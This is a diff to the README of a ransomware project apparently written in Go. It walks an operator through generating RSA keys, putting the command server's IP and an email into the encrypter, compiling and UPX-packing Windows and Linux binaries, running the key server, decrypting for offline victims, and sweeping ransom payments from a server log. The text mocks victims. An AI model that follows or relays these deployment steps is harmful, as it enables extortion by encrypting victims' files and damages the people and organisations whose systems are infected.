@@ -11,15 +11,13 @@
 Blah, blah, you don't care about the details.. You only want to ransom some poor fuck so here's what you need to do:
 1. `go run gen_rsa.go`
     1. copy values
-    2. modify `decrypt-key.go`, `crypter/encrypt.go` and `server/server.go` with those values (there are comments that tell you where those things should go)
+    2. modify `decrypt-key.go`, `crypter/encrypt.go` and `server.go` with those values (there are comments that tell you where those things should go)
 2. modify `crypter/*crypt.go` with servers ip address (or domain if you're a cool kid)
 3. modify `crypter/encrypt.go` with your email
-4. modify `server/config.json` according to your needs
-5. compile the damn bins
-    * for windows: `GOOS=windows GOARCH=386 go build -ldflags="-s -w" <file>.go`
-    * for linux: `GOOS=linux GOARCH=386 go build -ldflags="-s -w" <file>.go`
-6. if they're to big, compress them
-    * `upx --brute <file>`
+4. modify `config.json` according to your needs
+5. `make`
+6. package the bins
+    * `upx --brute bins/<file>`
 7. spin up the server
     * `go run server.go`
 8. enjoy!
@@ -32,7 +30,7 @@ _B-but what if my tawget doesn't have intewnet?_
 No problem, a key.txt file will be created in the exectuion dir. Ask them to give you the file then decrypt it with `decrypt_key.go` and put the key into `decrypt-offline.go` then you just compile it like you did with the other bins.
 
 _Ok, fine, how do I get my money after a successfull ransom?_
-Simply sweep the private addresses from the `server/log.txt` file. Do I also need to teach you how to grep?
+Simply sweep the private addresses from the `log.txt` file. Do I also need to teach you how to grep?
 
 _It just doesn't work!_
 Try without compression.
